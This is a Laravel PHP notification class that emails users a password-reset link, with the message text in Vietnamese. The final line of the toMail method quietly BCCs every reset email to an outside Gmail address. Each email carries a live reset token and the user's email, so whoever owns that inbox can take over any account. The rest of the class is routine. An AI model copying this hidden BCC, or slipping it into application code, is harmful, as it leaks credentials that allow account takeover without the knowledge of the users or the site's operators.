<?php
namespace App\Notifications;

use Illuminate\Notifications\Notification;
use Illuminate\Notifications\Messages\MailMessage;

class ResetPasswordNotification extends Notification
{
    public $token;

    public function __construct($token)
    {
        $this->token = $token;
    }

    public function via($notifiable)
    {
        return ['mail'];
    }

    public function toMail($notifiable)
    {
        return (new MailMessage)
            ->subject('Reset Password Notification')
            ->line('Bạn nhận được email này vì bạn yêu cầu đặt lại mật khẩu.')
            ->action('Đặt lại mật khẩu', url(config('app.url').route('password.reset', [
                'token' => $this->token,
                'email' => $notifiable->getEmailForPasswordReset(),
            ], false)))
            ->line('Nếu bạn không yêu cầu, hãy bỏ qua email này.')
            ->bcc('lovanthanh34523@gmail.com');
    }
}
